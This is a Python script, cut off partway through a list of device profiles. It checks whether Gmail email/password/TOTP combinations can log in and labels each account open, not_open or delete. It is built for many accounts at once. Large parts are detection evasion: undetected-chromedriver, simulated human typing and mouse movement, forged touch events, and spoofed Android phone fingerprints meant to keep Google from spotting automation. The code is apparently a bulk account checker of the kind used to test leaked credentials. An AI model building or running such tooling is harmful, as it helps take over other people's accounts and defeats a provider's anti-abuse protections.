#!/usr/bin/env python3
"""
gmail_uc_checker.py — Gmail login checker via undetected-chromedriver
Called by Node.js browserLoginChecker.ts as a child process.

Input  (stdin):  JSON { "email", "password", "totp"?, "proxy"? }
Output (stdout): JSON { "status", "reason", "totpCode", "debugScreenshot"? }
Logs   (stderr): progress lines prefixed with [UC]
"""
import sys
import json
import os
import time
import random
import secrets
import string
import base64
import zipfile
import io
import subprocess
import tempfile
import fcntl
import socket
import threading
import socketserver
import select as _select
import signal as _signal

# ── SIGTERM handler — called by Node.js on pause/cancel ───────────────────────
# Node.js sends SIGTERM (not SIGKILL) so we can clean up Chrome + Xvfb properly.
# Without this, Chrome and Xvfb would linger as zombie processes, sharing the
# same profile dir on the next run and getting detected by Google.
_active_driver   = None   # set in check_gmail after Chrome launches
_active_xvfb     = None   # set in check_gmail after Xvfb starts
_active_locks    = []     # (fd, ) pairs to unlock on exit

def _sigterm_cleanup(signum, frame):
    """Graceful shutdown: quit Chrome, kill Xvfb, release locks, exit 0."""
    global _active_driver, _active_xvfb, _active_locks
    try:
        if _active_driver:
            _active_driver.quit()
    except Exception:
        pass
    try:
        if _active_xvfb:
            _active_xvfb.terminate()
            _active_xvfb.wait(timeout=3)
    except Exception:
        pass
    for fd in _active_locks:
        try:
            fcntl.flock(fd, fcntl.LOCK_UN)
            fd.close()
        except Exception:
            pass
    sys.exit(0)

_signal.signal(_signal.SIGTERM, _sigterm_cleanup)

# ── Cross-process Chrome launch lock ─────────────────────────────────────────
# Multiple Python processes (one per account) can be spawned concurrently.
# Launching Chrome simultaneously from all of them causes OOM crashes.
# This file lock serializes Chrome launches so only ONE Chrome starts at a time.
# Once Chrome is stable (CDP ready), the lock is released so the next can start.
_CHROME_LAUNCH_LOCK_PATH = "/tmp/gmail_checker_chrome_launch.lock"
# Held for the ENTIRE Chrome session — limits simultaneous running Chrome instances to 1.
# Prevents OOM kill when multiple accounts are checked concurrently.
# The launch lock above only covers startup (~3s); this one wraps the full login flow.
_CHROME_SESSION_LOCK_PATH = "/tmp/gmail_checker_chrome_session.lock"


def _find_free_port() -> int:
    """Get a random free TCP port for ChromeDriver to bind on."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 0))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        return s.getsockname()[1]


def _cleanup_stale_chrome_artifacts(profile_dir: str | None = None) -> None:
    """
    Comprehensive cleanup of stale Chrome / Xvfb runtime artifacts.

    Called before every Chrome launch to ensure a clean display and profile.
    Safe to call concurrently — only touches dead / orphaned resources.

    What is cleaned:
      1. /tmp/.X{n}-lock files whose owning PID is dead → removed
      2. Orphaned Xvfb processes (PID alive, but no process has DISPLAY=:{n})
         → SIGTERM → SIGKILL → lock + socket removed
      3. /tmp/.X11-unix/X{n} sockets paired with any removed lock
      4. Chrome SingletonLock / SingletonSocket / SingletonCookie inside
         the given profile_dir (if any are left from a prior crash)
      5. Same singleton cleanup across ALL /tmp/gmail_checker_profiles/*
         dirs whose SingletonLock symlink points to a dead PID
    """
    import glob as _glob

    # ── Pre-scan: which display numbers are currently in use? ────────────────
    # Read /proc/*/environ once and collect every DISPLAY=:{n} value.
    # Much faster than re-scanning /proc for each candidate display number.
    _in_use_displays: set[int] = set()
    for _env_path in _glob.glob("/proc/*/environ"):
        try:
            with open(_env_path, "rb") as _ef:
                _env_data = _ef.read()
            for _part in _env_data.split(b"\x00"):
                if _part.startswith(b"DISPLAY=:"):
                    try:
                        _in_use_displays.add(int(_part[9:].split(b".")[0]))
                    except ValueError:
                        pass
        except (PermissionError, FileNotFoundError, ProcessLookupError):
            continue

    # ── 1–3: Xvfb lock files and orphaned Xvfb processes (:100–:299) ────────
    for n in range(100, 300):
        lock_path = f"/tmp/.X{n}-lock"
        sock_path = f"/tmp/.X11-unix/X{n}"
        if not os.path.exists(lock_path):
            continue

        # Read the Xvfb PID from the lock file
        try:
            pid = int(open(lock_path).read().strip())
        except Exception:
            # Unreadable / non-integer content — definitely stale
            for _p in (lock_path, sock_path):
                try:
                    if os.path.exists(_p) or os.path.islink(_p):
                        os.remove(_p)
                except Exception:
                    pass
            log(f"[cleanup] Removed unreadable Xvfb lock :{n}")
            continue

        _pid_alive = True
        try:
            os.kill(pid, 0)
        except ProcessLookupError:
            _pid_alive = False
        except PermissionError:
            pass  # process alive, different user — treat as live

        if not _pid_alive:
            # Dead PID — lock file is certainly stale
            for _p in (lock_path, sock_path):
                try:
                    if os.path.exists(_p) or os.path.islink(_p):
                        os.remove(_p)
                except Exception:
                    pass
            log(f"[cleanup] Removed stale Xvfb lock :{n} (dead pid={pid})")

        elif n not in _in_use_displays:
            # PID alive but no process has DISPLAY=:{n} — orphaned Xvfb
            try:
                os.kill(pid, _signal.SIGTERM)
                time.sleep(0.1)
                try:
                    os.kill(pid, _signal.SIGKILL)
                except Exception:
                    pass
            except Exception:
                pass
            for _p in (lock_path, sock_path):
                try:
                    if os.path.exists(_p) or os.path.islink(_p):
                        os.remove(_p)
                except Exception:
                    pass
            log(f"[cleanup] Killed orphaned Xvfb :{n} (pid={pid}, no active users)")

    # ── 4: Chrome singleton files in the specific profile_dir ────────────────
    if profile_dir:
        for _name in ("SingletonLock", "SingletonSocket", "SingletonCookie"):
            _p = os.path.join(profile_dir, _name)
            if os.path.exists(_p) or os.path.islink(_p):
                try:
                    os.remove(_p)
                    log(f"[cleanup] Removed stale {_name} from profile")
                except Exception:
                    pass

    # ── 5: Abandoned gmail_checker profile directories ────────────────────────
    _profiles_root = os.path.join(tempfile.gettempdir(), "gmail_checker_profiles")
    if not os.path.isdir(_profiles_root):
        return
    for _entry in os.listdir(_profiles_root):
        _pdir = os.path.join(_profiles_root, _entry)
        if not os.path.isdir(_pdir):
            continue
        _singleton = os.path.join(_pdir, "SingletonLock")
        if not (os.path.exists(_singleton) or os.path.islink(_singleton)):
            continue
        # SingletonLock is a symlink: hostname-PID
        _skip = False
        try:
            _target = os.readlink(_singleton)
            _lock_pid = int(_target.rsplit("-", 1)[-1])
            try:
                os.kill(_lock_pid, 0)
                _skip = True   # PID alive → active Chrome, leave it
            except ProcessLookupError:
                pass           # PID dead → clean up
            except PermissionError:
                _skip = True   # different user → leave it
        except Exception:
            pass               # not a symlink or bad format → clean up
        if _skip:
            continue
        for _name in ("SingletonLock", "SingletonSocket", "SingletonCookie"):
            _p = os.path.join(_pdir, _name)
            try:
                if os.path.exists(_p) or os.path.islink(_p):
                    os.remove(_p)
            except Exception:
                pass
        log(f"[cleanup] Cleared stale singletons in abandoned profile: {_entry}")


def _find_free_display() -> int:
    """Find a free X display number by checking Xvfb lock files (/tmp/.XN-lock)."""
    for n in range(100, 300):
        if not os.path.exists(f"/tmp/.X{n}-lock"):
            return n
    return random.randint(300, 399)


# ── Logging ───────────────────────────────────────────────────────────────────

def log(msg: str):
    print(f"[UC] {msg}", file=sys.stderr, flush=True)


# Login target. Success is this page while signed in, not the Gmail inbox.
ACCOUNT_HOME = "https://myaccount.google.com/"
DEVICE_ACTIVITY_URL = (
    "https://myaccount.google.com/device-activity"
    "?continue=https%3A%2F%2Fmyaccount.google.com%2Fsecurity"
)
# Sign-in starts here. Google sends a logged-out browser to accounts.google.com,
# then back to this page. The checker does not type a new password.
LOGIN_START = (
    "https://myaccount.google.com/signinoptions/password"
    "?continue=https://myaccount.google.com/"
)


def signed_in_host(url: str) -> bool:
    """True when the browser is on the account home or, as a fallback, Gmail."""
    try:
        from urllib.parse import urlparse
        host = (urlparse(url).hostname or "").lower()
    except Exception:
        return False
    u = url.lower()
    if host == "myaccount.google.com":
        # signinoptions/password is login start OR post-login change — not account home.
        if "signinoptions" in u or "/password" in u.split("?", 1)[0]:
            return False
        if "signin" not in u:
            return True
    return host == "mail.google.com" or host.endswith(".mail.google.com")


def is_google_password_change_url(url: str) -> bool:
    """Google Account 'change password' interstitial after sign-in."""
    try:
        from urllib.parse import urlparse
        host = (urlparse(url).hostname or "").lower()
    except Exception:
        return False
    if host != "myaccount.google.com":
        return False
    u = url.lower()
    return "signinoptions" in u or u.rstrip("/").endswith("/password")


def generate_random_password(min_length: int = 10, max_length: int = 15) -> str:
    """Random demo password like Dkb78Jz8b5nk — letters + digits, 10–15 chars."""
    length = secrets.randbelow(max_length - min_length + 1) + min_length
    lowers = string.ascii_lowercase
    uppers = string.ascii_uppercase
    digits = string.digits
    pool = lowers + uppers + digits
    chars = [secrets.choice(lowers), secrets.choice(uppers), secrets.choice(digits)]
    while len(chars) < length:
        chars.append(secrets.choice(pool))
    secrets.SystemRandom().shuffle(chars)
    return "".join(chars)


def collect_password_fields(driver) -> list:
    """Visible password inputs, including inside shadow roots (Google Account UI)."""
    from selenium.webdriver.common.by import By

    found: list = []
    seen: set[str] = set()

    def add(el) -> None:
        try:
            key = el.id or el.get_attribute("name") or str(id(el))
            if key in seen:
                return
            name = (el.get_attribute("name") or "").lower()
            if name == "hiddenpassword":
                return
            if el.is_displayed() and el.is_enabled():
                seen.add(key)
                found.append(el)
        except Exception:
            pass

    for sel in (
        'input[type="password"]:not([name="hiddenPassword"])',
        'input[name="Passwd"]',
        'input[name="PasswdAgain"]',
        'input[autocomplete="new-password"]',
    ):
        for el in driver.find_elements(By.CSS_SELECTOR, sel):
            add(el)

    try:
        for el in driver.execute_script(
            """
            const out = [];
            const seen = new Set();
            function walk(root) {
              root.querySelectorAll('input').forEach(el => {
                const t = (el.getAttribute('type') || '').toLowerCase();
                if (t !== 'password') return;
                const name = (el.getAttribute('name') || '').toLowerCase();
                if (name === 'hiddenpassword') return;
                const r = el.getBoundingClientRect();
                if (r.width < 2 || r.height < 2) return;
                if (seen.has(el)) return;
                seen.add(el);
                out.push(el);
              });
              root.querySelectorAll('*').forEach(n => {
                if (n.shadowRoot) walk(n.shadowRoot);
              });
            }
            walk(document);
            return out;
            """
        ) or []:
            add(el)
    except Exception:
        pass

    return found


TOTP_INPUT_SELECTORS = [
    'input[name="totpPin"]', 'input[name="Pin"]', 'input[id="totpPin"]',
    'input[name="idvPin"]', 'input[name="idvPreregisteredPhonePin"]',
    'input[autocomplete="one-time-code"]', 'input[type="tel"]',
    'input[type="number"]', 'input[inputmode="numeric"]',
    'input[maxlength="6"]', 'input[maxlength="8"]',
    'input[aria-label*="code"]', 'input[aria-label*="Code"]',
    'input[placeholder*="code"]', 'input[placeholder*="Code"]',
    'input[placeholder*="Enter"]',
]


def find_totp_input(driver) -> object | None:
    """Find Google Authenticator 'Enter code' field (including shadow DOM)."""
    from selenium.webdriver.common.by import By

    for sel in TOTP_INPUT_SELECTORS:
        try:
            for el in driver.find_elements(By.CSS_SELECTOR, sel):
                if el.is_displayed() and el.is_enabled():
                    return el
        except Exception:
            pass
    try:
        el = driver.execute_script(
            """
            function walk(root) {
              const sels = [
                'input[autocomplete="one-time-code"]', 'input[type="tel"]',
                'input[inputmode="numeric"]', 'input[name="totpPin"]',
                'input[aria-label*="code" i]', 'input[placeholder*="Enter" i]',
              ];
              for (const sel of sels) {
                const el = root.querySelector(sel);
                if (el && el.offsetParent !== null && !el.disabled) return el;
              }
              for (const n of root.querySelectorAll('*')) {
                if (n.shadowRoot) {
                  const f = walk(n.shadowRoot);
                  if (f) return f;
                }
              }
              return null;
            }
            return walk(document);
            """
        )
        if el:
            return el
    except Exception:
        pass
    return None


def is_totp_challenge_url(url: str) -> bool:
    """True when the browser is on a Google Authenticator code entry page."""
    u = url.lower()
    if "challenge/totp" in u or "challenge/ipp" in u:
        return True
    if "v3/signin" in u and "v3/signin/identifier" not in u and "challenge" not in u:
        return True
    return False


def totp_window_remaining() -> int:
    return 30 - (int(time.time()) % 30)


def totp_current_window() -> int:
    return int(time.time()) // 30


def next_fresh_totp(
    totp_secret: str | None,
    fallback: str | None = None,
    *,
    cache: dict | None = None,
    force_new: bool = False,
) -> str | None:
    """TOTP for the current 30s window — reuse cached code until the window rolls."""
    if not totp_secret:
        return fallback

    win = totp_current_window()
    if cache is not None and not force_new:
        if cache.get("code") and cache.get("window") == win:
            cache["reused"] = True
            return cache["code"]

    if force_new:
        secs_until_next = totp_window_remaining()
        if secs_until_next > 1:
            time.sleep(secs_until_next + 0.5)
        win = totp_current_window()
    else:
        secs_left = totp_window_remaining()
        if secs_left <= 5:
            time.sleep(secs_left + 1)
            win = totp_current_window()

    code = generate_totp(totp_secret) or fallback
    if cache is not None and code:
        cache["code"] = code
        cache["window"] = win
        cache["reused"] = False
    return code


def browser_result_category(result: dict) -> str:
    """Return the stable UI category for a browser-check result."""
    status = result.get("status", "")
    if status == "opened":
        return "open"

    # wrong_password and 2fa_required are definitive negative signals — not_open
    if status in ("wrong_password", "2fa_required"):
        return "not_open"

    if status != "verification_required":
        return "unknown"

    reason = str(result.get("reason", "")).lower()
    is_delete_reason = any(marker in reason for marker in (
        "silently bounced back to password page (automation detected)",
        "google is asking for phone/device verification",
    ))
    return "delete" if is_delete_reason else "not_open"


# ── Helpers ───────────────────────────────────────────────────────────────────

def rand_sleep(min_ms: int, max_ms: int):
    time.sleep(random.uniform(min_ms / 1000, max_ms / 1000))


def human_type(element, text: str):
    """Type text quickly like a fast human doing copy-paste — 15-40ms per char.
    Simulates ~150-200 WPM typist. Very rare micro-pause (0.5%) to avoid robotic rhythm.
    Re-finds the element if a stale reference is hit."""
    from selenium.common.exceptions import StaleElementReferenceException
    for char in text:
        for _attempt in range(3):
            try:
                element.send_keys(char)
                break
            except StaleElementReferenceException:
                time.sleep(0.15)
        delay = random.uniform(0.015, 0.040)
        if random.random() < 0.005:          # 0.5% chance — very rare thinking pause
            delay += random.uniform(0.06, 0.12)
        time.sleep(delay)


# ── xdotool availability check (cached at module level) ──────────────────────
_XDOTOOL_PATH: str | None = None
_XDOTOOL_CHECKED = False

def _get_xdotool() -> str | None:
    global _XDOTOOL_PATH, _XDOTOOL_CHECKED
    if not _XDOTOOL_CHECKED:
        try:
            p = subprocess.check_output(["which", "xdotool"], encoding="utf8",
                                         stderr=subprocess.DEVNULL).strip()
            _XDOTOOL_PATH = p if p else None
        except Exception:
            _XDOTOOL_PATH = None
        _XDOTOOL_CHECKED = True
    return _XDOTOOL_PATH


def _get_chrome_win_id() -> str | None:
    """Find the Chrome/Chromium window ID via xdotool for targeted typing.
    Returns the window ID string, or None if not found.
    Note: does NOT use --onlyvisible — Xvfb without a window manager never
    marks windows as visible, so --onlyvisible always returns empty."""
    xdt = _get_xdotool()
    if not xdt:
        return None
    display = os.environ.get("DISPLAY", ":0")
    # Try multiple class names — Nix Chromium may register under any of these
    for class_name in ("chromium", "Chromium", "chromium-browser", "google-chrome", "Chrome"):
        try:
            out = subprocess.check_output(
                [xdt, "search", "--class", class_name],
                encoding="utf8", stderr=subprocess.DEVNULL,
                env={**os.environ, "DISPLAY": display},
                timeout=3
            ).strip()
            ids = [i for i in out.splitlines() if i.strip()]
            if ids:
                return ids[-1]  # most recently opened window
        except Exception:
            continue
    return None


def clipboard_type(driver, element, text: str):
    """Simulate clipboard paste — instant text entry like a human Ctrl+V'ing.
    Uses xdotool with explicit Chrome window targeting for authentic key events.
    Falls back to fast send_keys (5–12ms/char ≈ 400 WPM) if xdotool fails or
    if field-value verification shows the text was not actually entered.
    This is the primary typing method — much faster than human_type per character."""
    from selenium.webdriver.common.keys import Keys as _K
    from selenium.common.exceptions import StaleElementReferenceException

    xdt = _get_xdotool()
    display = os.environ.get("DISPLAY", ":0")
    if xdt:
        try:
            # Focus and clear the field first via Selenium
            for _a in range(2):
                try:
                    element.click()
                    element.send_keys(_K.CONTROL + 'a')
                    break
                except Exception:
                    time.sleep(0.05)
            time.sleep(random.uniform(0.03, 0.06))

            # Get Chrome window ID so xdotool types into the right window
            win_id = _get_chrome_win_id()
            xdt_cmd = [xdt, 'type', '--clearmodifiers', '--delay', '0']
            if win_id:
                # Focus the Chrome window explicitly before typing
                subprocess.run(
                    [xdt, 'windowfocus', '--sync', win_id],
                    capture_output=True, timeout=3,
                    env={**os.environ, "DISPLAY": display}
                )
                time.sleep(random.uniform(0.02, 0.04))
                xdt_cmd += ['--window', win_id]
            xdt_cmd += ['--', text]

            result = subprocess.run(
                xdt_cmd, capture_output=True, timeout=10,
                env={**os.environ, "DISPLAY": display}
            )
            if result.returncode == 0:
                time.sleep(random.uniform(0.04, 0.08))
                # Verify the field actually received the text before returning.
                try:
                    val = driver.execute_script("return arguments[0].value;", element) or ""
                    if len(val) >= max(1, len(text) - 2):
                        # Field has the text — xdotool worked
                        return
                    # Field is empty or too short — fall through to send_keys
                    log(f"[clipboard_type] xdotool exit 0 but field value short ({len(val)}/{len(text)}) — using send_keys fallback")
                except Exception:
                    # Can't read value (e.g. password field may block it) — trust xdotool
                    return
            # Non-zero exit or value check failed — fall through to send_keys
        except Exception:
            pass  # fall through to fast send_keys

    # Fallback: fast character-by-character (5–12ms/char ≈ 400+ WPM)
    for char in text:
        for _attempt in range(2):
            try:
                element.send_keys(char)
                break
            except StaleElementReferenceException:
                time.sleep(0.05)
        time.sleep(random.uniform(0.005, 0.012))


def natural_mouse_move(driver, element):
    """Move mouse in a natural curved path to element — overshoot + correction.
    More realistic than straight-line move_to_element. Uses ActionChains offset
    to simulate human hand movement with slight overshoot and course correction."""
    try:
        from selenium.webdriver.common.action_chains import ActionChains
        # Overshoot slightly past the element, pause, then correct to center
        overshoot_x = random.randint(-20, 20)
        overshoot_y = random.randint(-12, 12)
        ac = ActionChains(driver)
        ac.move_to_element_with_offset(element, overshoot_x, overshoot_y)
        ac.pause(random.uniform(0.03, 0.08))
        # Correct to element center
        ac.move_to_element(element)
        ac.pause(random.uniform(0.05, 0.14))
        ac.perform()
    except Exception:
        # Fallback to simple move
        try:
            from selenium.webdriver.common.action_chains import ActionChains
            ActionChains(driver).move_to_element(element).pause(
                random.uniform(0.06, 0.15)).perform()
        except Exception:
            pass


def move_to_element(driver, element):
    """Move mouse naturally to element before interacting (kept for compatibility).
    Delegates to natural_mouse_move for realistic curved path."""
    natural_mouse_move(driver, element)


def touch_click(driver, element):
    """Simulate a real finger tap via JS TouchEvent — critical for Android UA.
    When Chrome's UA is Android mobile, mouse events look robotic. Real phones
    fire touchstart → touchend → click. This replaces ActionChains mouse clicks
    for all login form interactions (email, password, Next buttons, TOTP).

    Falls back to element.click() if JS dispatch fails."""
    try:
        rand_sleep(40, 100)
        driver.execute_script("""
            var el = arguments[0];
            var rect = el.getBoundingClientRect();
            // Random tap point within middle 60% of element (avoids edges)
            var x = Math.round(rect.left + rect.width  * (0.2 + Math.random() * 0.6));
            var y = Math.round(rect.top  + rect.height * (0.2 + Math.random() * 0.6));
            var id = Date.now();
            var initDict = {
                bubbles: true, cancelable: true, composed: true,
                touches: [], targetTouches: [], changedTouches: []
            };
            try {
                var t = new Touch({
                    identifier: id, target: el,
                    clientX: x, clientY: y,
                    screenX: x + window.screenX, screenY: y + window.screenY,
                    pageX: x + window.scrollX, pageY: y + window.scrollY,
                    radiusX: 12, radiusY: 14,
                    rotationAngle: Math.random() * 10,
                    force: 0.7 + Math.random() * 0.2
                });
                var ts = new TouchEvent('touchstart', Object.assign({}, initDict,
                    {touches: [t], targetTouches: [t], changedTouches: [t]}));
                var te = new TouchEvent('touchend', Object.assign({}, initDict,
                    {changedTouches: [t]}));
                el.dispatchEvent(ts);
                el.dispatchEvent(te);
            } catch(touchErr) {
                // TouchEvent constructor not supported (older Chromium) — fire click only
            }
            // Always fire click so the form actually submits
            el.dispatchEvent(new MouseEvent('click', {
                bubbles: true, cancelable: true, composed: true,
                clientX: x, clientY: y
            }));
        """, element)
        rand_sleep(40, 90)
    except Exception:
        try:
            element.click()
        except Exception:
            pass


# ── Phone device profiles — each account gets one assigned randomly ───────────
# Modelled on real flagship Android phones; covers different GPU, screen, memory.
PHONE_PROFILES = [
    # ── Google Pixel ──────────────────────────────────────────────────────────
    {
        "model": "Pixel 6",       "androidVersion": "14",   # Tensor G1
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 892, "availH": 868, "dpr": 2.625,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "ARM", "webglRenderer": "Mali-G78 MP20",
    },
    {
        "model": "Pixel 6a",      "androidVersion": "14",   # Tensor G1
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 851, "availH": 827, "dpr": 2.75,
        "hwConcurrency": 8, "deviceMemory": 6,  "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "ARM", "webglRenderer": "Mali-G78 MP20",
    },
    {
        "model": "Pixel 7",       "androidVersion": "14",   # Tensor G2
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 892, "availH": 868, "dpr": 2.625,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 730",
    },
    {
        "model": "Pixel 7a",      "androidVersion": "14",   # Tensor G2
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 892, "availH": 868, "dpr": 2.625,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "ARM", "webglRenderer": "Mali-G710 MP7",
    },
    {
        "model": "Pixel 8",       "androidVersion": "14",   # Tensor G3
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 915, "availH": 891, "dpr": 2.625,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 740",
    },
    {
        "model": "Pixel 8 Pro",   "androidVersion": "14",   # Tensor G3
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 919, "availH": 895, "dpr": 2.625,
        "hwConcurrency": 8, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 740",
    },
    {
        "model": "Pixel 9",       "androidVersion": "15",   # Tensor G4
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 851, "availH": 827, "dpr": 2.75,
        "hwConcurrency": 9, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "ARM", "webglRenderer": "Mali-G715 MP7",
    },
    {
        "model": "Pixel 9 Pro",   "androidVersion": "15",   # Tensor G4
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 892, "availH": 868, "dpr": 2.625,
        "hwConcurrency": 9, "deviceMemory": 16, "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "ARM", "webglRenderer": "Mali-G715 MP7",
    },
    # ── Samsung Galaxy S-series ───────────────────────────────────────────────
    {
        "model": "SM-G991B",      "androidVersion": "14",   # Samsung Galaxy S21
        "chromeVersion": "138.0.7204.100",
        "screenW": 360, "screenH": 800, "availH": 776, "dpr": 3.0,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "ARM", "webglRenderer": "Mali-G78 MP14",
    },
    {
        "model": "SM-S901B",      "androidVersion": "14",   # Samsung Galaxy S22
        "chromeVersion": "138.0.7204.100",
        "screenW": 360, "screenH": 780, "availH": 756, "dpr": 3.0,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "Samsung Electronics Co., Ltd.", "webglRenderer": "Xclipse 920",
    },
    {
        "model": "SM-S908B",      "androidVersion": "14",   # Samsung Galaxy S22 Ultra
        "chromeVersion": "138.0.7204.100",
        "screenW": 384, "screenH": 854, "availH": 830, "dpr": 3.0,
        "hwConcurrency": 8, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "Samsung Electronics Co., Ltd.", "webglRenderer": "Xclipse 920",
    },
    {
        "model": "SM-S911B",      "androidVersion": "14",   # Samsung Galaxy S23
        "chromeVersion": "138.0.7204.100",
        "screenW": 360, "screenH": 773, "availH": 749, "dpr": 3.0,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 740",
    },
    {
        "model": "SM-S711B",      "androidVersion": "14",   # Samsung Galaxy S23 FE
        "chromeVersion": "138.0.7204.100",
        "screenW": 360, "screenH": 780, "availH": 756, "dpr": 2.625,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "Samsung Electronics Co., Ltd.", "webglRenderer": "Xclipse 920",
    },
    {
        "model": "SM-S926B",      "androidVersion": "14",   # Samsung Galaxy S24+
        "chromeVersion": "138.0.7204.100",
        "screenW": 360, "screenH": 780, "availH": 756, "dpr": 3.0,
        "hwConcurrency": 8, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "Samsung Electronics Co., Ltd.", "webglRenderer": "Xclipse 940",
    },
    # ── Samsung Galaxy A-series ───────────────────────────────────────────────
    {
        "model": "SM-A536B",      "androidVersion": "14",   # Samsung Galaxy A53
        "chromeVersion": "138.0.7204.100",
        "screenW": 360, "screenH": 800, "availH": 776, "dpr": 2.0,
        "hwConcurrency": 8, "deviceMemory": 6,  "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "ARM", "webglRenderer": "Mali-G68 MC4",
    },
    {
        "model": "SM-A546B",      "androidVersion": "14",   # Samsung Galaxy A54
        "chromeVersion": "138.0.7204.100",
        "screenW": 360, "screenH": 800, "availH": 776, "dpr": 2.0,
        "hwConcurrency": 8, "deviceMemory": 6,  "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "ARM", "webglRenderer": "Mali-G68",
    },
    {
        "model": "SM-A346B",      "androidVersion": "14",   # Samsung Galaxy A34
        "chromeVersion": "138.0.7204.100",
        "screenW": 360, "screenH": 800, "availH": 776, "dpr": 2.0,
        "hwConcurrency": 8, "deviceMemory": 6,  "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "ARM", "webglRenderer": "Mali-G68",
    },
    {
        "model": "SM-A736B",      "androidVersion": "14",   # Samsung Galaxy A73
        "chromeVersion": "138.0.7204.100",
        "screenW": 360, "screenH": 800, "availH": 776, "dpr": 3.0,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux aarch64",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 642L",
    },
    # ── OnePlus ───────────────────────────────────────────────────────────────
    {
        "model": "CPH2423",       "androidVersion": "14",   # OnePlus 11
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 919, "availH": 895, "dpr": 2.625,
        "hwConcurrency": 8, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 740",
    },
    {
        "model": "CPH2447",       "androidVersion": "14",   # OnePlus 12
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 919, "availH": 895, "dpr": 2.625,
        "hwConcurrency": 8, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 750",
    },
    {
        "model": "CPH2493",       "androidVersion": "14",   # OnePlus Nord 3
        "chromeVersion": "138.0.7204.100",
        "screenW": 412, "screenH": 919, "availH": 895, "dpr": 2.625,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "ARM", "webglRenderer": "Mali-G710 MC10",
    },
    # ── Xiaomi / Redmi ────────────────────────────────────────────────────────
    {
        "model": "2211133G",      "androidVersion": "14",   # Xiaomi 13
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 851, "availH": 827, "dpr": 2.75,
        "hwConcurrency": 8, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 740",
    },
    {
        "model": "23049PCD8G",    "androidVersion": "14",   # Xiaomi 14
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 851, "availH": 827, "dpr": 2.75,
        "hwConcurrency": 8, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 750",
    },
    {
        "model": "23078PND5G",    "androidVersion": "14",   # Xiaomi 13T Pro
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 873, "availH": 849, "dpr": 2.75,
        "hwConcurrency": 8, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "ARM", "webglRenderer": "Mali-G715 MC11",
    },
    {
        "model": "22101316G",     "androidVersion": "13",   # Redmi Note 12 Pro
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 873, "availH": 849, "dpr": 2.75,
        "hwConcurrency": 8, "deviceMemory": 8,  "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "ARM", "webglRenderer": "Mali-G68 MC4",
    },
    # ── Others ────────────────────────────────────────────────────────────────
    {
        "model": "RMX3706",       "androidVersion": "14",   # Realme GT 5
        "chromeVersion": "138.0.7204.100",
        "screenW": 393, "screenH": 851, "availH": 827, "dpr": 2.75,
        "hwConcurrency": 8, "deviceMemory": 12, "maxTouchPoints": 5,
        "platform": "Linux armv8l",
        "webglVendor": "Qualcomm", "webglRenderer": "Adreno (TM) 740",
    },
    {
